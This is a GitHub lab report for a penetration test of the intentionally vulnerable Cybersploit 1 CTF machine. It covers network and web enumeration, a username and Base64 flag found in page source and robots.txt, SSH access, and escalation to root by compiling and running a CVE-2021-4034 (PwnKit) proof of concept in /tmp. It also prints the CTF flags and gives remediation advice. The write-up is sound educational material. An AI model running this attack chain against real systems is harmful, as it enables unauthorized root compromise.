# 🔐 Cybersploit 1 — VAPT Lab Report

![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-blue)
![Target](https://img.shields.io/badge/Target-Cybersploit%201-red)
![Focus](https://img.shields.io/badge/Focus-VAPT-orange)
![Status](https://img.shields.io/badge/Status-Completed-success)

A hands-on **Vulnerability Assessment and Penetration Testing (VAPT)** assessment of the intentionally vulnerable **Cybersploit 1** laboratory machine.

> ⚠️ **Disclaimer:** This assessment was performed against an intentionally vulnerable laboratory machine in an authorized and isolated environment for cybersecurity education. The techniques documented here must only be used against systems for which explicit authorization has been obtained.

---

## 📑 Table of Contents

- [Overview](#-overview)
- [Objectives](#-objectives)
- [Lab Environment](#-lab-environment)
- [Tools Used](#-tools-used)
- [Methodology](#-methodology)
- [Attack Path](#-attack-path)
- [Phase 1 — Reconnaissance](#-phase-1--reconnaissance)
- [Phase 2 — Port and Service Enumeration](#-phase-2--port-and-service-enumeration)
- [Phase 3 — Web Enumeration](#-phase-3--web-enumeration)
- [Phase 4 — Information Disclosure](#-phase-4--information-disclosure)
- [Flag 1](#-flag-1)
- [Flag 2](#-flag-2)
- [Phase 5 — SSH Initial Access](#-phase-5--ssh-initial-access)
- [Phase 6 — Local Enumeration](#-phase-6--local-enumeration)
- [Phase 7 — Privilege Escalation](#-phase-7--privilege-escalation)
- [Phase 8 — CVE-2021-4034](#-phase-8--cve-2021-4034)
- [Phase 9 — Root Access](#-phase-9--root-access)
- [Phase 10 — Final Flag](#-phase-10--final-flag)
- [Flags Collected](#-flags-collected)
- [Security Findings](#-security-findings)
- [Remediation](#-remediation)
- [Lessons Learned](#-lessons-learned)
- [Key Commands](#-key-commands)
- [Repository Structure](#-repository-structure)
- [Author](#-author)
- [Disclaimer](#-disclaimer)

---

# 🔎 Overview

**Cybersploit 1** is an intentionally vulnerable Linux-based CTF/VAPT machine. The objective was to identify the target, enumerate exposed services, investigate the web application, obtain an authenticated foothold, perform local privilege enumeration, identify a privilege-escalation weakness, obtain root access, and retrieve the final flag.

The assessment was conducted from Kali Linux against the target on the VMware laboratory network.

---

# 🎯 Objectives

The assessment objectives were:

- Discover the target on the local network.
- Enumerate open TCP ports and services.
- Fingerprint the HTTP service.
- Perform web directory and file enumeration.
- Inspect web-source comments for information disclosure.
- Investigate `robots.txt`.
- Decode Base64 and binary-encoded information.
- Establish SSH access using the discovered information.
- Enumerate the compromised Linux host.
- Check sudo permissions and SUID binaries.
- Investigate the root-owned SUID `pkexec` binary.
- Test the target for CVE-2021-4034 in the lab.
- Verify root-level privileges.
- Retrieve the final proof-of-compromise flag.
- Document findings and remediation recommendations.

---

# 🖥️ Lab Environment

## Attacker Machine

| Parameter | Value |
|---|---|
| OS | Kali Linux |
| IP Address | `192.168.204.129` |
| Interface | `eth0` |
| Architecture | `x86_64` |

## Target Machine

| Parameter | Value |
|---|---|
| Machine | Cybersploit 1 |
| IP Address | `192.168.204.132` |
| OS | Ubuntu 12.04.5 LTS |
| Kernel | `3.13.0-32-generic` |
| Architecture | `i686 / i386` |
| Web Server | Apache/2.2.22 |
| Initial User | `itsskv` |
| Final Privilege | `root` |

---

# 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `arp-scan` | Local network discovery |
| `Nmap` | Port and service enumeration |
| `curl` | HTTP response analysis |
| `WhatWeb` | Web technology fingerprinting |
| `Gobuster` | Directory/file discovery |
| `Feroxbuster` | Recursive web content discovery |
| `SSH` | Remote authenticated access |
| `SCP` | File transfer |
| `find` | SUID enumeration |
| `GCC` | Proof-of-concept compilation |
| `Python` | Binary-to-ASCII decoding |
| Linux utilities | Local enumeration and verification |

---

# 🧭 Methodology

The assessment followed this workflow:

```text
Reconnaissance
      ↓
Network Discovery
      ↓
Port & Service Enumeration
      ↓
Web Enumeration
      ↓
Information Disclosure
      ↓
Initial Access
      ↓
Local Enumeration
      ↓
Privilege Escalation Analysis
      ↓
CVE-2021-4034 Validation
      ↓
Root Access
      ↓
Proof of Compromise
```

---

# 🧩 Attack Path

```text
Target Discovery
      ↓
192.168.204.132
      ↓
Nmap
      ↓
┌───────────────┬───────────────┐
│ TCP/22 SSH    │ TCP/80 HTTP   │
└───────┬───────┴───────┬───────┘
        │               ↓
        │       Web Enumeration
        │               ↓
        │       Username Disclosure
        │               ↓
        │          robots.txt
        │               ↓
        │       Base64 Decoding
        │               ↓
        └──────→ SSH Access
                        ↓
                  User: itsskv
                        ↓
                 Local Enumeration
                        ↓
                  SUID Enumeration
                        ↓
                  /usr/bin/pkexec
                        ↓
                 CVE-2021-4034
                        ↓
                    root shell
                        ↓
              /root/finalflag.txt
                        ↓
                    Flag 3
```

---

# 🔍 Phase 1 — Reconnaissance

The first step was to discover active hosts on the VMware laboratory network.

Command:

```bash
sudo arp-scan -l
```

The scan identified the following relevant host:

```text
192.168.204.132    00:0c:29:8b:e3:af
```

The target IP was therefore selected for further assessment.

## Evidence

![ARP Scan](screenshots/01_arp_scan.png)

**Screenshot:** `01_arp_scan.png`

---

# 🌐 Phase 2 — Port and Service Enumeration

Nmap was used to identify exposed TCP services.

Command:

```bash
sudo nmap -Pn 192.168.204.132
```

Result:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

| Port | Service | Assessment Relevance |
|---|---|---|
| `22/tcp` | SSH | Potential authenticated access |
| `80/tcp` | HTTP | Web application investigation |

## Evidence

![Nmap Scan](screenshots/02_nmap_scan.png)

**Screenshot:** `02_nmap_scan.png`

---

# 🌍 Phase 3 — Web Enumeration

## 3.1 HTTP Analysis

The HTTP response was examined using:

```bash
curl -i http://192.168.204.132/
```

The response identified:

```text
Server: Apache/2.2.22 (Ubuntu)
```

The page title and content indicated that this was the Cybersploit CTF web application.

## 3.2 Technology Fingerprinting

The web stack was fingerprinted using:

```bash
whatweb http://192.168.204.132
```

Technologies identified included Apache 2.2.22, Ubuntu, Bootstrap 4.5.0, jQuery, and HTML5.

---

## 3.3 Gobuster Enumeration

Gobuster was used to discover accessible files and directories:

```bash
gobuster dir \
-u http://192.168.204.132/ \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,html
```

Interesting results included:

```text
/index
/index.html
/robots
/robots.txt
/hacker
/hacker.gif
```

`robots.txt` was selected for further investigation.

---

## 3.4 Feroxbuster Enumeration

Feroxbuster was also used for web-content discovery:

```bash
feroxbuster \
-u http://192.168.204.132/ \
-w /usr/share/wordlists/dirb/common.txt
```

The scan confirmed accessible resources including `/`, `/index`, `/index.html`, `/robots`, `/robots.txt`, `/hacker`, and `/hacker.gif`.

## Evidence

![Feroxbuster Enumeration](screenshots/03_feroxbuster.png)

**Screenshot:** `03_feroxbuster.png`

---

# 🔐 Phase 4 — Information Disclosure

## 4.1 Username Disclosure

The HTML source was inspected for comments and hidden information. The following comment was identified:

```html
<!-------------username:itsskv--------------------->
```

This disclosed the valid system username:

```text
itsskv
```

### Security Impact

Exposing valid usernames through publicly accessible source code reduces the information required for authentication attacks and can assist an attacker in gaining an initial foothold.

---

## 4.2 robots.txt Analysis

The discovered `robots.txt` file was requested directly:

```bash
curl -i http://192.168.204.132/robots.txt
```

The response contained the following Base64-encoded value:

```text
R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9
```

## Evidence

![robots.txt](screenshots/04_robots_txt.png)

**Screenshot:** `04_robots_txt.png`

---

## 4.3 Base64 Decoding

The value was decoded using:

```bash
echo 'R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9' | base64 -d
```

Decoded output:

```text
Good Work !
Flag!: cybersploit{youtube.com/c/cybersploit}
```

This revealed Flag 1.

## Evidence

![Base64 Decoding](screenshots/05_base64_decode.png)

**Screenshot:** `05_base64_decode.png`

---

# 🏁 Flag 1

```text
cybersploit{youtube.com/c/cybersploit}
```

---

# 📁 Flag 2 Discovery

After SSH access was obtained, the user's home directory was examined:

```bash
ls
```

A file named `flag2.txt` was identified.

The file contained groups of eight binary digits, for example:

```text
01100111 01101111 01101111 01100100
```

These represented ASCII characters encoded as binary.

The data was decoded with Python:

```bash
python -c "print ''.join(chr(int(x,2)) for x in open('flag2.txt').read().split())"
```

Decoded output:

```text
good work !
flag2: cybersploit{https://t.me/cybersploit1}
```

## Evidence

![Flag 2 Binary Decoding](screenshots/06_flag2_binary_decode.png)

**Screenshot:** `06_flag2_binary_decode.png`

---

# 🏁 Flag 2

```text
cybersploit{https://t.me/cybersploit1}
```

---

# 🔑 Phase 5 — SSH Initial Access

The username discovered in the web application was used to test the SSH service:

```bash
ssh itsskv@192.168.204.132
```

Authentication succeeded using the discovered credential value, providing an interactive shell as `itsskv`.

The target reported:

```text
Welcome to Ubuntu 12.04.5 LTS
```

This established the initial authenticated foothold.

## Evidence

![SSH Initial Access](screenshots/07_ssh_initial_access.png)

**Screenshot:** `07_ssh_initial_access.png`

---

# 🖥️ Phase 6 — Local System Enumeration

## 6.1 User Enumeration

The current account was verified:

```bash
whoami
```

Output:

```text
itsskv
```

UID and group membership:

```bash
id
```

Output:

```text
uid=1001(itsskv) gid=1001(itsskv) groups=1001(itsskv)
```

The session was therefore running with non-root privileges.

---

## 6.2 OS and Kernel Enumeration

```bash
uname -a
```

Output:

```text
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
```

The distribution was verified with:

```bash
cat /etc/issue
```

Output:

```text
Ubuntu 12.04.5 LTS
```

### System Summary

| Parameter | Value |
|---|---|
| OS | Ubuntu 12.04.5 LTS |
| Kernel | `3.13.0-32-generic` |
| Architecture | `i686 / i386` |
| User | `itsskv` |
| UID | `1001` |
| GID | `1001` |

## Evidence

![System Information](screenshots/08_system_information.png)

**Screenshot:** `08_system_information.png`

---

# 🔎 Phase 7 — Privilege Enumeration

## 7.1 Sudo Check

The account's sudo permissions were checked:

```bash
sudo -l
```

The target returned:

```text
Sorry, user itsskv may not run sudo on cybersploit-CTF.
```

No useful sudo privilege was available, so SUID enumeration was performed.

---

## 7.2 SUID Enumeration

The following command was used:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the discovered SUID binaries was:

```text
/usr/bin/pkexec
```

Other SUID binaries included `su`, `mount`, `umount`, `passwd`, `sudo`, and `at`.

Because `pkexec` was root-owned and SUID-enabled, it was selected for further analysis.

## Evidence

![SUID Enumeration](screenshots/09_suid_enumeration.png)

**Screenshot:** `09_suid_enumeration.png`

---

# ⚙️ Phase 8 — CVE-2021-4034

## 8.1 pkexec Version and Permissions

The installed version was checked:

```bash
pkexec --version
```

Output:

```text
pkexec version 0.104
```

PolicyKit package information was checked using:

```bash
dpkg -s policykit-1 | grep -E 'Package|Version|Status'
```

Relevant output:

```text
Package: policykit-1
Status: install ok installed
Version: 0.104-1ubuntu1.1
```

The binary permissions were verified:

```bash
ls -l /usr/bin/pkexec
```

Output:

```text
-rwsr-xr-x 1 root root 18104 Sep 11 2013 /usr/bin/pkexec
```

The `s` in the owner permission field confirmed that SUID was enabled.

| Property | Value |
|---|---|
| Binary | `/usr/bin/pkexec` |
| Owner | `root` |
| Group | `root` |
| SUID | Enabled |
| pkexec | `0.104` |
| PolicyKit | `0.104-1ubuntu1.1` |

## Evidence

![pkexec and PolicyKit](screenshots/10_pkexec_version.png)

**Screenshot:** `10_pkexec_version.png`

---

## 8.2 Supporting Tools

The target contained a compiler and Python interpreter:

```bash
gcc --version
```

```text
gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
```

```bash
python --version
```

```text
Python 2.7.3
```

The availability of GCC allowed the proof-of-concept source to be compiled directly on the target.

---

## 8.3 Temporary Directory

The `/tmp` directory was inspected:

```bash
ls -la /tmp
```

The directory had standard world-writable temporary-directory permissions (`drwxrwxrwt`) and was used as the staging location for the lab proof-of-concept.

## Evidence

![Temporary Directory](screenshots/12_tmp_directory.png)

**Screenshot:** `12_tmp_directory.png`

---

## 8.4 Proof-of-Concept Repository

A proof-of-concept for CVE-2021-4034 was obtained on Kali Linux and reviewed before use in the lab.

The repository contained the C source file and documentation.

## Evidence

![PoC Repository](screenshots/13_poc_repository.png)

**Screenshot:** `13_poc_repository.png`

---

## 8.5 PoC Documentation Review

The repository documentation was reviewed to understand the compilation and execution procedure.

The documented compilation pattern was:

```bash
gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
```

## Evidence

![PoC README](screenshots/14_poc_readme.png)

**Screenshot:** `14_poc_readme.png`

---

## 8.6 Architecture Verification

The Kali Linux architecture was checked:

```bash
uname -m
```

Output:

```text
x86_64
```

The target was running `i686/i386`. Because of this architecture difference, the **source code was transferred to the target and compiled locally**, rather than transferring a Kali-built 64-bit executable.

## Evidence

![Architecture Verification](screenshots/15_architecture_check.png)

**Screenshot:** `15_architecture_check.png`

---

## 8.7 PoC Transfer

The source code was transferred from Kali Linux to the target using SCP:

```bash
scp cve-2021-4034-poc.c itsskv@192.168.204.132:/tmp/
```

The file was then verified on the target:

```bash
ls -l /tmp/cve-2021-4034-poc.c
```

The source was successfully present in `/tmp`.

## Evidence

![PoC Transfer](screenshots/16_poc_transfer.png)

**Screenshot:** `16_poc_transfer.png`

---

## 8.8 Local Compilation

The proof-of-concept was compiled on the target:

```bash
gcc /tmp/cve-2021-4034-poc.c -o /tmp/pwnkit
```

The resulting executable was examined:

```bash
file /tmp/pwnkit
```

Output confirmed:

```text
ELF 32-bit LSB executable, Intel 80386
```

This matched the target architecture.

## Evidence

![PoC Compilation](screenshots/17_poc_compiled.png)

**Screenshot:** `17_poc_compiled.png`

---

# 🚨 Phase 9 — Root Access

The compiled proof-of-concept was executed from the `itsskv` shell:

```bash
/tmp/pwnkit
```

The process returned an elevated shell prompt:

```text
#
```

The elevated privileges were then verified explicitly.

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
```

And:

```bash
whoami
```

Output:

```text
root
```

This confirmed successful local privilege escalation in the intentionally vulnerable laboratory environment.

## Evidence

![Root Shell](screenshots/18_root_shell.png)

**Screenshot:** `18_root_shell.png`

![Root Verification](screenshots/19_root_verification.png)

**Screenshot:** `19_root_verification.png`

---

# 🏠 Phase 10 — Final Flag

With root privileges established, the root user's home directory was enumerated:

```bash
ls -la /root
```

The file `finalflag.txt` was found.

The file was read using:

```bash
cat /root/finalflag.txt
```

The relevant output was:

```text
flag3: cybersploit{Z3X21CW42C4}
```

This provided the final proof of compromise.

## Evidence

![Final Flag](screenshots/20_final_flag.png)

**Screenshot:** `20_final_flag.png`

---

# 🏁 Flags Collected

| Flag | Discovery Location | Value |
|---|---|---|
| Flag 1 | `/robots.txt` | `cybersploit{youtube.com/c/cybersploit}` |
| Flag 2 | `/home/itsskv/flag2.txt` | `cybersploit{https://t.me/cybersploit1}` |
| Flag 3 | `/root/finalflag.txt` | `cybersploit{Z3X21CW42C4}` |

---

# 📋 Security Findings

| ID | Finding | Severity | Evidence |
|---|---|---|---|
| V-01 | Username disclosure through HTML source | Low | `01` / web enumeration evidence |
| V-02 | Sensitive information exposed through `robots.txt` | Medium | `04_robots_txt.png` |
| V-03 | Base64 used to encode sensitive information | Low | `05_base64_decode.png` |
| V-04 | Obsolete Ubuntu operating system | High | `08_system_information.png` |
| V-05 | Root-owned SUID `pkexec` vulnerable to CVE-2021-4034 | Critical | `09_suid_enumeration.png`, `10_pkexec_version.png` |

> **Severity values in this table are assessment classifications for this laboratory report, not vendor scores.**

---

# 🛡️ Remediation Recommendations

## 1. Remove Sensitive Information from Public Web Content

Do not expose usernames, credentials, tokens, flags, or other sensitive information through HTML comments, `robots.txt`, JavaScript, source code, or public configuration files.

## 2. Do Not Treat Base64 as Encryption

Base64 is an encoding mechanism and does not provide confidentiality. Sensitive credentials must be protected using appropriate authentication and cryptographic controls.

## 3. Upgrade the Operating System

The target was running Ubuntu 12.04.5 LTS, an obsolete release. The system should be migrated to a supported operating system release and maintained with current security updates.

## 4. Patch PolicyKit

Upgrade PolicyKit to a vendor-supported version containing the security fix for CVE-2021-4034.

## 5. Audit SUID Binaries

Administrators should regularly review SUID-enabled binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Unnecessary SUID permissions should be removed.

## 6. Apply Least Privilege

Users and services should receive only the permissions required for their intended functions. Privileged utilities should be carefully controlled and monitored.

## 7. Maintain Secure Authentication

Usernames should not be disclosed unnecessarily, and authentication credentials should never be exposed through publicly accessible web resources.

---

# 🧠 Lessons Learned

This laboratory exercise provided practical experience with:

- ARP-based host discovery
- Nmap enumeration
- HTTP analysis
- Web technology fingerprinting
- Gobuster directory enumeration
- Feroxbuster content discovery
- HTML source inspection
- Information disclosure
- Base64 decoding
- Binary-to-ASCII decoding
- SSH authentication
- Linux local enumeration
- SUID enumeration
- PolicyKit analysis
- CVE investigation
- Architecture compatibility
- Proof-of-concept compilation
- Local privilege escalation
- Root privilege verification
- Post-exploitation enumeration
- Technical VAPT reporting

The exercise demonstrated how multiple weaknesses can be chained together to progress from unauthenticated network access to complete root-level compromise in an intentionally vulnerable environment.

---

# 📚 Key Commands

## Network Discovery

```bash
sudo arp-scan -l
```

## Port Scanning

```bash
sudo nmap -Pn 192.168.204.132
```

## HTTP Analysis

```bash
curl -i http://192.168.204.132/
```

## Web Fingerprinting

```bash
whatweb http://192.168.204.132
```

## Gobuster

```bash
gobuster dir -u http://192.168.204.132/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Feroxbuster

```bash
feroxbuster -u http://192.168.204.132/ -w /usr/share/wordlists/dirb/common.txt
```

## robots.txt

```bash
curl -i http://192.168.204.132/robots.txt
```

## Base64 Decoding

```bash
echo '<encoded-data>' | base64 -d
```

## SSH

```bash
ssh itsskv@192.168.204.132
```

## Local Enumeration

```bash
whoami
id
uname -a
cat /etc/issue
sudo -l
```

## SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

## PolicyKit Enumeration

```bash
pkexec --version
```

```bash
dpkg -s policykit-1 | grep -E 'Package|Version|Status'
```

```bash
ls -l /usr/bin/pkexec
```

## File Transfer

```bash
scp cve-2021-4034-poc.c itsskv@192.168.204.132:/tmp/
```

## Compilation

```bash
gcc /tmp/cve-2021-4034-poc.c -o /tmp/pwnkit
```

## Binary Verification

```bash
file /tmp/pwnkit
```

## Privilege Verification

```bash
id
whoami
```

## Final Flag

```bash
cat /root/finalflag.txt
```

---

# 📁 Repository Structure

```text
cybersploit1-vapt/
│
├── README.md
│
├── screenshots/
│   ├── 01_arp_scan.png
│   ├── 02_nmap_scan.png
│   ├── 03_feroxbuster.png
│   ├── 04_robots_txt.png
│   ├── 05_base64_decode.png
│   ├── 06_flag2_binary_decode.png
│   ├── 07_ssh_initial_access.png
│   ├── 08_system_information.png
│   ├── 09_suid_enumeration.png
│   ├── 10_pkexec_version.png
│   ├── 11_policykit_package.png
│   ├── 12_tmp_directory.png
│   ├── 13_poc_repository.png
│   ├── 14_poc_readme.png
│   ├── 15_architecture_check.png
│   ├── 16_poc_transfer.png
│   ├── 17_poc_compiled.png
│   ├── 18_root_shell.png
│   ├── 19_root_verification.png
│   └── 20_final_flag.png
│
└── report/
    └── Cybersploit1_VAPT_Report.pdf
```

### Screenshot Naming Convention

The screenshots are numbered according to the assessment workflow so that the GitHub documentation follows the same sequence as the practical assessment.

> `11_policykit_package.png` can be used for the separate PolicyKit package/version evidence if you keep a separate copy. If the same image is used for both PolicyKit and `pkexec` evidence, it is acceptable to keep only the most relevant screenshot.

---

# 👨‍💻 Author

**Adarsh R K**

Cybersecurity | VAPT | Penetration Testing

This repository documents a hands-on penetration-testing assessment performed against an intentionally vulnerable laboratory environment. It demonstrates practical skills in reconnaissance, enumeration, web security testing, Linux enumeration, vulnerability analysis, privilege escalation, and technical security reporting.

---

# ⚠️ Disclaimer

This project was conducted in an intentionally vulnerable and authorized laboratory environment.

The techniques, commands, and methodologies documented in this repository are intended for cybersecurity education, authorized penetration testing, and laboratory practice only.

**Do not use these techniques against systems, networks, applications, or accounts without explicit authorization.**
